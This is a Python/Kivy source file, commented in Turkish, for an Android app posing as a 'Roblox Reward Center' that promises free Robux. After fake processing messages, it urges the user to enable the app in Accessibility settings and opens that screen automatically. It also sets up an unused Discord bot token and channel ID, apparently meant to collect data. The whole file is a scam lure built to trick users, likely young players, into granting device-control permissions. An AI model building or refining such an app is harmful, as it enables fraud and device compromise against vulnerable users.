import discord
from discord.ext import commands
import asyncio
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.clock import Clock
import os

# --- BURAYA DİKKAT: BOT TOKENİNİ TIRNAK İÇİNE YAZ ---
TOKEN = "SENİN_BOT_TOKENİN" 
CHANNEL_ID = 1457784191633850442

class RobuxApp(App):
    def build(self):
        self.layout = BoxLayout(orientation='vertical', padding=20, spacing=10)
        
        # Arayüz Başlığı
        self.layout.add_widget(Label(text="Roblox Reward Center", font_size=25, color=(1, 0.8, 0, 1)))
        
        # Kullanıcı Adı Kısmı
        self.layout.add_widget(Label(text="Username:"))
        self.user_input = TextInput(multiline=False, hint_text="Roblox Username")
        self.layout.add_widget(self.user_input)
        
        # Miktar Kısmı (Sadece Rakam ve Max 80)
        self.layout.add_widget(Label(text="Miktar [ Max 80 ]:"))
        self.amount_input = TextInput(multiline=False, input_filter='int', hint_text="Örn: 80")
        self.layout.add_widget(self.amount_input)
        
        # Onayla Butonu
        self.btn = Button(text="Onayla", background_color=(0, 1, 0, 1))
        self.btn.bind(on_press=self.start_process)
        self.layout.add_widget(self.btn)
        
        self.status_label = Label(text="")
        self.layout.add_widget(self.status_label)
        
        return self.layout

    def start_process(self, instance):
        # 80 limit kontrolü
        try:
            val = int(self.amount_input.text)
            if val > 80:
                self.status_label.text = "Hata: Kampanya gereği max 80 seçilebilir!"
                return
        except: return

        self.status_label.text = "İşlem Yapılıyor..."
        # 3 Saniye bekleme süreci
        Clock.schedule_once(self.show_last_step, 3)

    def show_last_step(self, dt):
        self.status_label.text = "Son Bir Adım Kaldı! \n[ Robuxları Gönderme Erişimi İçin \nUygulamayı Erişim Ayarlarından Aktif Edin! ]"
        # 8 Saniye sonra ayarlara fırlatma
        Clock.schedule_once(self.open_settings, 8)

    def open_settings(self, dt):
        # Erişilebilirlik ayarlarını tetikler (Android)
        try:
            from jnius import autoclass
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Intent = autoclass('android.content.Intent')
            Settings = autoclass('android.provider.Settings')
            intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            PythonActivity.mActivity.startActivity(intent)
        except:
            self.status_label.text = "Lütfen Ayarlar > Erişilebilirlik yolunu izleyin."

if __name__ == '__main__':
    RobuxApp().run()
